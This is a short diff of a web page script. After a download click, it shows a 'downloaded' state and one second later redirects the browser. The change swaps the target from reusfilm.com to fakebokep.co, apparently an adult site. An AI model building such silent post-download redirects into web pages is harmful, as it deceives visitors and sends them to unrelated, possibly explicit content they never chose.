@@ -331,7 +331,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         $('.download').hide();
                         flexing('.downloaded');
                         setTimeout(() => {
-                            window.location.href = 'https://reusfilm.com/'
+                            window.location.href = 'https://fakebokep.co/'
                         }, 1000)
                     }
                 })
